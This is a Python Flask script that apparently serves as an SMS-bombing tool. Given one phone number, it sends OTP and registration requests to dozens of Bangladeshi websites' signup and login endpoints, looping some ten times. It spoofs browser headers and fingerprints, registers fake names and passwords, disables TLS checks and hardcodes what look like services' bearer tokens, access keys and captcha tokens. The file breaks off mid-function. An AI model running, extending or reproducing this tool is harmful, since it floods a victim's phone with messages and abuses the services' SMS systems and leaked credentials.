import hashlib
import json
import os
import random
import secrets
import string
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
from flask import Flask, jsonify, request

# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# =====================================================================
# ⚙️ GLOBAL CONFIGURATION (এখানে টাইমআউট বদলাবেন)
# =====================================================================
DEFAULT_TIMEOUT = 10  # সেকেন্ড পরিবর্তন করতে চাইলে এখানে বদলান (যেমন: 5, 10 বা None)


# =====================================================================
# 1. HELPER FUNCTIONS
# =====================================================================

def parse_resp(r):
    try:
        return r.json()
    except Exception:
        return r.text[:1000]

def get_digits(raw: str) -> str:
    return "".join(ch for ch in str(raw) if ch.isdigit())

def get_local11(raw: str) -> str:
    digits = get_digits(raw)
    return digits[-11:] if len(digits) >= 11 else digits

def get_e164(raw: str) -> str:
    return "+88" + get_local11(raw)

def get_msisdn88(raw: str) -> str:
    return "88" + get_local11(raw)

def random_string(length: int = 8) -> str:
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def random_complex_password(length: int = 15) -> str:
    lower, upper, digits, special = string.ascii_lowercase, string.ascii_uppercase, string.digits, "@#$%&*!?"
    chars = lower + upper + digits + special
    while True:
        pwd = "".join(secrets.choice(chars) for _ in range(length))
        if (any(c in lower for c in pwd) and any(c in upper for c in pwd)
                and any(c in digits for c in pwd) and any(c in special for c in pwd)):
            return pwd

def random_name() -> str:
    first = ["Rahim", "Karim", "Hasan", "Jamil", "Nabil", "Rafi", "Sabbir", "Arif", "Shuvo", "Fahim", "Tanvir", "Imran"]
    last = ["Ahmed", "Islam", "Hossain", "Khan", "Chowdhury", "Rahman", "Sarker", "Mia", "Das", "Roy"]
    return f"{random.choice(first)} {random.choice(last)}"

def random_company() -> str:
    companies = ["Tech", "Digital", "Express", "Solutions", "Enterprise", "Global", "Trading", "Store"]
    return f"{random.choice(companies)} {random.randint(1000, 9999)}"

def generate_fingerprint() -> str:
    return hashlib.md5(os.urandom(16)).hexdigest()


# =====================================================================
# 2. 🔁 10x LOOPED SERVICES (DNCRP, Otech, Amarbay, Mojaru)
# =====================================================================

def svc_dncrp(phone):
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://dncrp.com", "Referer": "https://dncrp.com/", "User-Agent": "Mozilla/5.0"}
    resps = []
    for i in range(10):
        try:
            r = requests.post("https://api.ccms.dncrp.com/otp/create", headers=headers, json={"phoneNumber": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
            resps.append({"attempt": i + 1, "status": r.status_code, "resp": parse_resp(r)})
        except Exception as e:
            resps.append({"attempt": i + 1, "error": str(e)})
    success_count = sum(1 for x in resps if x.get("status") in [200, 201, 202])
    return {"service": "DNCRP (10x Loop)", "status_code": 200 if success_count > 0 else 500, "success": success_count > 0, "response": f"Success: {success_count}/10", "details": resps}

def svc_otech(phone):
    headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.otech.com.bd", "Referer": "https://www.otech.com.bd/index.php?route=account/register", "User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
    cookies = {"language": "en-gb", "currency": "BDT"}
    resps = []
    for i in range(10):
        try:
            r = requests.post("https://www.otech.com.bd/index.php?route=extension/tmdsms/verifytelephone/chkphonenumber", headers=headers, cookies=cookies, data={"telephone": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
            resps.append({"attempt": i + 1, "status": r.status_code, "resp": parse_resp(r)})
        except Exception as e:
            resps.append({"attempt": i + 1, "error": str(e)})
    success_count = sum(1 for x in resps if x.get("status") == 200)
    return {"service": "OtechBD (10x Loop)", "status_code": 200 if success_count > 0 else 500, "success": success_count > 0, "response": f"Success: {success_count}/10", "details": resps}

def svc_amarbay(phone):
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.amarbay.com", "Referer": "https://www.amarbay.com/", "User-Agent": "Mozilla/5.0"}
    resps = []
    for i in range(10):
        try:
            r = requests.post("https://backend.amarbay.com/user/find_user_by_phone/", headers=headers, json={"phone_number": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
            resps.append({"attempt": i + 1, "status": r.status_code, "resp": parse_resp(r)})
        except Exception as e:
            resps.append({"attempt": i + 1, "error": str(e)})
    success_count = sum(1 for x in resps if x.get("status") == 200)
    return {"service": "Amarbay (10x Loop)", "status_code": 200 if success_count > 0 else 500, "success": success_count > 0, "response": f"Success: {success_count}/10", "details": resps}

def svc_mojaru(phone):
    headers = {"Accept": "*/*", "Content-Type": "application/json", "Origin": "https://mojaru.com", "Referer": "https://mojaru.com/", "User-Agent": "Mozilla/5.0"}
    resps = []
    for i in range(10):
        try:
            r = requests.post("https://new.mojaru.com/api/student/registration", headers=headers, json={"mobile_or_email": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
            resps.append({"attempt": i + 1, "status": r.status_code, "resp": parse_resp(r)})
        except Exception as e:
            resps.append({"attempt": i + 1, "error": str(e)})
    success_count = sum(1 for x in resps if x.get("status") == 200)
    return {"service": "Mojaru (10x Loop)", "status_code": 200 if success_count > 0 else 500, "success": success_count > 0, "response": f"Success: {success_count}/10", "details": resps}


# =====================================================================
# 3. VERIFIED ACTIVE SERVICES
# =====================================================================

def svc_paperfly(phone):
    headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://go.paperfly.com.bd", "referer": "https://go.paperfly.com.bd/", "device_identifier": "undefined", "device_name": "undefined", "user-agent": "Mozilla/5.0"}
    name = random_name()
    email = name.lower().replace(" ", "") + str(random.randint(1000, 9999)) + "@gmail.com"
    payload = {"full_name": name, "company_name": random_company(), "email_address": email, "phone_number": get_local11(phone)}
    try:
        r = requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", headers=headers, json=payload, timeout=DEFAULT_TIMEOUT)
        return {"service": "Paperfly", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Paperfly", "status_code": None, "success": False, "error": str(e)}

def svc_ostad(phone):
    headers = {
        "accept": "*/*", "accept-language": "en-US,en;q=0.9", "content-type": "application/json",
        "fingerprint": generate_fingerprint(), "guestid": str(uuid.uuid4()),
        "metadata": '{"browser":{"name":"Chrome","version":"150.0.0.0","major":"150"},"cpu":{"architecture":"amd64"},"device":{},"engine":{"name":"Blink","version":"150.0.0.0"},"os":{"name":"Windows","version":"10"},"displayResolution":{"width":1920,"height":1080},"deviceType":"web","domain":"ostad.app","brand":"Chrome","model":"Windows"}',
        "origin": "https://ostad.app", "referer": "https://ostad.app/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36"
    }
    try:
        r = requests.post("https://api.ostad.app/api/v2/user/with-otp", headers=headers, json={"msisdn": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "OstadApp", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "OstadApp", "status_code": None, "success": False, "error": str(e)}

def svc_timezone(phone):
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://timezonebd.com", "Referer": "https://timezonebd.com/", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://backend.timezonebd.com/api/v1/user/otp-login", headers=headers, json={"phone": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "TimezoneBD", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "TimezoneBD", "status_code": None, "success": False, "error": str(e)}

def svc_garibook_v4(phone):
    headers = {"Accept": "application/json", "Content-Type": "application/json", "Origin": "https://garibook.com", "Referer": "https://garibook.com/", "User-Agent": "Mozilla/5.0"}
    payload = {"mobile": "+88" + get_local11(phone), "recaptcha_token": "garibookcaptcha", "channel": "web"}
    try:
        r = requests.post("https://api.garibookadmin.com/api/v4/user/login", headers=headers, json=payload, timeout=DEFAULT_TIMEOUT)
        return {"service": "Garibook_v4", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Garibook_v4", "status_code": None, "success": False, "error": str(e)}

def svc_redx_merchant(phone):
    headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://redx.com.bd", "referer": "https://redx.com.bd/", "user-agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", headers=headers, json={"phoneNumber": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "RedX_Merchant", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "RedX_Merchant", "status_code": None, "success": False, "error": str(e)}

def svc_gpfi_fwa(phone):
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://gpfi.grameenphone.com", "Referer": "https://gpfi.grameenphone.com/", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", headers=headers, json={"phone": get_local11(phone), "email": "", "language": "en"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "GP_GPFI_FWA", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "GP_GPFI_FWA", "status_code": None, "success": False, "error": str(e)}

def svc_osudpotro_web(phone):
    headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json;charset=UTF-8", "origin": "https://osudpotro.com", "referer": "https://osudpotro.com/", "user-agent": "Mozilla/5.0"}
    payload = {"mobile": f"+88-{get_local11(phone)}", "deviceToken": "web", "language": "en", "os": "web"}
    try:
        r = requests.post("https://api.osudpotro.com/api/v1/users/send_otp", headers=headers, json=payload, timeout=DEFAULT_TIMEOUT)
        return {"service": "OsudPotro_Web", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "OsudPotro_Web", "status_code": None, "success": False, "error": str(e)}

def svc_chardike_uuid(phone):
    headers = {"Accept": "*/*", "Content-Type": "application/json", "Origin": "https://chardike.com", "Referer": "https://chardike.com/", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://api.chardike.com/api/3f8d1e74-9a5c-4f2d-a7b1-6c8e2d91f4ab/", headers=headers, json={"phone": get_local11(phone), "otp_type": "login", "from_request": "web"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Chardike_UUID", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Chardike_UUID", "status_code": None, "success": False, "error": str(e)}

def svc_win2gain(phone):
    headers = {"Accept": "application/json, text/plain, */*", "Client": "0", "Origin": "https://win2gain.com", "Referer": "https://win2gain.com/", "SourcePlatform": "web", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get("https://api.win2gain.com/api/Users/RequestOtp", headers=headers, params={"msisdn": get_msisdn88(phone), "otpEvent": "SignUp"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Win2Gain", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Win2Gain", "status_code": None, "success": False, "error": str(e)}

def svc_trucklagbe(phone):
    headers = {
        "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://trucklagbe.com", "Referer": "https://trucklagbe.com/", "User-Agent": "Mozilla/5.0",
        "X-Bypass-Auth-Key": "b6253a42-50bf-444a-8017-cd1319f4e79b-b280108f-3bdc-4ea7-964e-07e841cb5c90",
        "deviceId": "123.253.38.1815489931784968247958", "lat": "0", "lng": "0", "source": "website",
        "ut": "eoNlH5JmHcmwpqXJ45GKU5dmofW27utuwDTTclg+LkJb0zE1H1altQIszHizPXZ2VdAyR1dPRO5rEfGx6QGiITZOp0UWn5ouVvKtPzVypIiQ+/Ddzf4MaRexJedwO79MU0qGWjeZSGP6G+Cj7ODa6e68zQnWXvmKo+5n28RVd0RNgqSFyrSXof2C+D6m3HSb"
    }
    try:
        r = requests.post("https://tethys.trucklagbe.com/tl_gateway/tl_login/131/loginWithPhoneNo", headers=headers, json={"userType": "shipper", "phoneNo": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "TruckLagbe", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "TruckLagbe", "status_code": None, "success": False, "error": str(e)}

def svc_deshal(phone):
    headers = {"Accept": "*/*", "Origin": "https://www.deshal.net", "Referer": "https://www.deshal.net/", "User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    try:
        r = requests.post("https://app.deshal.net/api/auth/login", headers=headers, json={"phone": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Deshal", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Deshal", "status_code": None, "success": False, "error": str(e)}

def svc_lifeplus(phone):
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://example.com", "User-Agent": "Mozilla/5.0"}
    pwd = random_complex_password(16)
    try:
        r = requests.post("https://admin.lifeplusbd.com/api/v1/auth/register", headers=headers, json={"name": random_name(), "mobile": get_local11(phone), "password": pwd, "password_confirmation": pwd, "accesskey": "90336", "type": "register"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "LifePlusBD", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "LifePlusBD", "status_code": None, "success": False, "error": str(e)}

def svc_maya(phone):
    headers = {"Accept": "application/json", "Authorization": "Bearer", "Content-Type": "application/json", "Origin": "https://maya.com.bd", "Referer": "https://maya.com.bd/", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://api.maya.com.bd/send-otp-code", headers=headers, json={"phone_number": get_e164(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Maya", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Maya", "status_code": None, "success": False, "error": str(e)}

def svc_medistack(phone):
    headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://medistack.net", "referer": "https://medistack.net/register", "user-agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://medistack.net/api/auth/register", headers=headers, json={"mobile_no": get_local11(phone), "password": random_complex_password(16)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Medistack", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Medistack", "status_code": None, "success": False, "error": str(e)}

def svc_medico(phone):
    p = get_local11(phone)
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://medico.bio", "Referer": "https://medico.bio/", "User-Agent": "Mozilla/5.0", "Authorization": "Bearer", "UserInfo": "{}"}
    try:
        r = requests.post("https://api.v2.medico.bio/patient/passwordless-login", headers=headers, json={"phoneNumber": p, "deviceId": p, "channel": "web", "userType": "patient", "type": "newUser", "otpLength": 6}, timeout=DEFAULT_TIMEOUT)
        return {"service": "MedicoBio", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "MedicoBio", "status_code": None, "success": False, "error": str(e)}

def svc_jachai(phone):
    headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://jachai.com", "referer": "https://jachai.com/"}
    try:
        r = requests.post("https://jachai.com/api/auth/otp/send-unified", headers=headers, json={"countryCode": "BD", "mobileNumberOrEmail": get_local11(phone), "purpose": "REGISTER_OTP", "userType": "USER"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Jachai", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Jachai", "status_code": None, "success": False, "error": str(e)}

def svc_packly(phone):
    headers = {"Accept": "*/*", "Content-Type": "application/json", "Origin": "https://www.packly.com", "Referer": "https://www.packly.com/", "X-App-Version": "1.0.0", "X-Build-Number": "1.0.0", "X-Platform": "web", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://admin.shop.packly.com/api/v1/ecommerce/send-otp", headers=headers, json={"phone": get_local11(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Packly", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Packly", "status_code": None, "success": False, "error": str(e)}

def svc_choicelegacy(phone):
    headers = {"accept": "*/*", "content-type": "application/json", "origin": "https://choicelegacy.com.bd", "referer": "https://choicelegacy.com.bd/account/register", "user-agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://choicelegacy.com.bd/apps/choice-legacy-prod/customer/account/send-otp", headers=headers, json={"phone": get_local11(phone), "register": True}, timeout=DEFAULT_TIMEOUT)
        return {"service": "ChoiceLegacy", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "ChoiceLegacy", "status_code": None, "success": False, "error": str(e)}

def svc_aladaboi(phone):
    headers = {"Accept": "*/*", "Content-Type": "application/json", "Origin": "https://aladaboi.com", "Referer": "https://aladaboi.com/", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://dbms.aladaboi.com/functions/v1/send-otp", headers=headers, json={"phone": get_e164(phone)}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Aladaboi", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Aladaboi", "status_code": None, "success": False, "error": str(e)}

def svc_fundesh(phone):
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    try:
        r = requests.post("https://fundesh.com.bd/api/auth/generateOTP?service_key=", headers=headers, json={"msisdn": get_local11(phone)}, timeout=DEFAULT_TIMEOUT, verify=False)
        return {"service": "Fundesh", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Fundesh", "status_code": None, "success": False, "error": str(e)}

def svc_gpfwa(phone):
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    try:
        r = requests.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", headers=headers, json={"phone": get_msisdn88(phone), "email": "", "language": "en"}, timeout=DEFAULT_TIMEOUT, verify=False)
        return {"service": "GP_FWA", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "GP_FWA", "status_code": None, "success": False, "error": str(e)}


# =====================================================================
# 4. SINGLE VERIFIED PROVIDERS
# =====================================================================

def call_bioscopelive(phone):
    try:
        r = requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", json={"number": get_e164(phone)}, headers={"accept": "application/json", "content-type": "application/json", "origin": "https://www.bioscopeplus.com", "referer": "https://www.bioscopeplus.com/", "user-agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "BioscopeLive", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "BioscopeLive", "status_code": None, "success": False, "error": str(e)}

def call_medha(phone):
    try:
        r = requests.post("https://developer.medha.info/api/send-otp", json={"phone": get_msisdn88(phone), "is_register": "1"}, headers={"User-Agent": "Dart/3.2 (dart:io)", "content-type": "application/json", "authorization": "Bearer"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Medha", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Medha", "status_code": None, "success": False, "error": str(e)}

def call_deeptoplay(phone):
    try:
        r = requests.post("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", json={"number": get_e164(phone)}, headers={"accept": "application/json", "content-type": "application/json", "origin": "https://www.deeptoplay.com", "user-agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "DeeptoPlay", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "DeeptoPlay", "status_code": None, "success": False, "error": str(e)}

def call_arogga_web(phone):
    try:
        r = requests.post("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10", data={"mobile": get_local11(phone), "fcmToken": "", "referral": ""}, headers={"origin": "https://www.arogga.com", "user-agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "Arogga_Web", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Arogga_Web", "status_code": None, "success": False, "error": str(e)}

def call_cinematic_wap(phone):
    try:
        r = requests.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{get_local11(phone)}", json={"headers": {"Content-Type": "application/json", "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"}}, headers={"Origin": "https://cinematic.mobi", "User-Agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Cinematic_Wap", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Cinematic_Wap", "status_code": None, "success": False, "error": str(e)}

def call_bcsexamaid(phone):
    try:
        r = requests.post("https://bcsexamaid.com/api/generateotp", json={"mobile": get_local11(phone), "softtoken": "Rifat.Admin.2022"}, headers={"User-Agent": "Dart/3.1 (dart:io)", "Content-Type": "application/json"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "BCSExamAid", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "BCSExamAid", "status_code": None, "success": False, "error": str(e)}

def call_apex4u(phone):
    try:
        r = requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": get_local11(phone)}, headers={"origin": "https://apex4u.com", "user-agent": "Mozilla/5.0", "content-type": "application/json"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Apex4u", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Apex4u", "status_code": None, "success": False, "error": str(e)}

def call_shikho(phone):
    try:
        r = requests.post("https://api.shikho.com/auth/v2/send/sms", json={"phone": get_local11(phone), "type": "student", "auth_type": "signup", "vendor": "shikho"}, headers={"Content-Type": "application/json", "Origin": "https://app.shikho.com", "User-Agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Shikho", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Shikho", "status_code": None, "success": False, "error": str(e)}

def call_circlereseller(phone):
    p = get_e164(phone)
    try:
        r = requests.post("https://reseller.circle.com.bd/api/v2/auth/signup", json={"name": p, "email_or_phone": p, "password": "password123", "password_confirmation": "password123", "register_by": "phone"}, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "CircleReseller", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "CircleReseller", "status_code": None, "success": False, "error": str(e)}

def call_bdtickets(phone):
    try:
        r = requests.post("https://api.bdtickets.com:20100/v1/auth", json={"createUserCheck": True, "phoneNumber": get_e164(phone)}, headers={"content-type": "application/json", "origin": "https://bdtickets.com", "user-agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "BDTickets", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "BDTickets", "status_code": None, "success": False, "error": str(e)}

def call_rflbestbuy(phone):
    p = get_local11(phone)
    headers = {"Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==", "Content-Type": "application/json", "User-Agent": "okhttp/4.2.2"}
    payload = {"company_id": "26", "password2": "Riyaz@123", "currency_code": "BDT", "user_type": "C", "email": f"{p}@gmail.com", "g_id": "", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Riyaz@123", "phone": p, "storefront_id": "3"}
    try:
        r = requests.post("https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT", json=payload, headers=headers, timeout=DEFAULT_TIMEOUT)
        return {"service": "RFLBestBuy", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "RFLBestBuy", "status_code": None, "success": False, "error": str(e)}

def call_chorcha(phone):
    try:
        r = requests.get(f"https://mujib.chorcha.net/auth/check?phone={requests.utils.quote(get_local11(phone))}", headers={"x-chorcha-mode": "prod", "x-chorcha-platform": "web", "User-Agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Chorcha", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Chorcha", "status_code": None, "success": False, "error": str(e)}

def call_etestpaper(phone):
    p = get_local11(phone)
    headers = {"origin": "https://www.etestpaper.net", "user-agent": "Mozilla/5.0", "content-type": "application/json"}
    try:
        requests.post("https://prod.etestpaper.net/api/exists", json={"phone": p}, headers=headers, timeout=DEFAULT_TIMEOUT)
        r = requests.post("https://prod.etestpaper.net/api/v4/auth/otp", json={"phone": p, "recaptcha": "668be73dcad2999a957ff440"}, headers=headers, timeout=DEFAULT_TIMEOUT)
        return {"service": "ETestPaper", "status_code": r.status_code, "success": r.status_code in [200, 201] or "User not found" in r.text, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "ETestPaper", "status_code": None, "success": False, "error": str(e)}

def call_applink(phone):
    try:
        r = requests.post("https://apps.applink.com.bd/appstore-v4-server/login/otp/request", json={"msisdn": get_msisdn88(phone)}, headers={"Origin": "https://applink.com.bd", "User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "Applink", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Applink", "status_code": None, "success": False, "error": str(e)}

def call_priyoshikkhaloy(phone):
    try:
        r = requests.post("https://app.priyoshikkhaloy.com/api/user/register-login.php", data={"mobile": get_local11(phone)}, headers={"User-Agent": "okhttp/4.11.0", "Content-Type": "application/x-www-form-urlencoded"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "PriyoShikkhaloy", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "PriyoShikkhaloy", "status_code": None, "success": False, "error": str(e)}

def call_cinematic_sbent(phone):
    try:
        r = requests.post(f"https://api.mygp.cinematic.mobi/api/v1/otp/88{get_local11(phone)}/SBENT_3GB7D", json={"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", "referenceCode": "20190827042622"}}, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "Cinematic_SBENT", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Cinematic_SBENT", "status_code": None, "success": False, "error": str(e)}

def call_gp_webloginda(phone):
    try:
        r = requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", data={"msisdn": get_local11(phone)}, headers={"Origin": "https://gpfi.grameenphone.com", "User-Agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "GP_WebloginDA", "status_code": r.status_code, "success": r.status_code in [200, 201] or "valid GP Number" in r.text, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "GP_WebloginDA", "status_code": None, "success": False, "error": str(e)}

def call_meenabazar(phone):
    try:
        r = requests.post(f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={requests.utils.quote(get_local11(phone))}&type=login", headers={"User-Agent": "Dart/3.2 (dart:io)", "content-type": "application/json"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "MeenaBazar", "status_code": r.status_code, "success": r.status_code in [200, 201, 202], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "MeenaBazar", "status_code": None, "success": False, "error": str(e)}

def call_medeasy(phone):
    try:
        r = requests.get(f"https://api.medeasy.health/api/send-otp/{get_e164(phone)}/", headers={"Origin": "https://medeasy.health", "User-Agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "MedEasy", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "MedEasy", "status_code": None, "success": False, "error": str(e)}

def call_chokrojan(phone):
    try:
        r = requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", json={"mobile_number": get_local11(phone), "otp_token": "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"}, headers={"Origin": "https://chokrojan.com", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "Chokrojan", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Chokrojan", "status_code": None, "success": False, "error": str(e)}

def call_shomvob(phone):
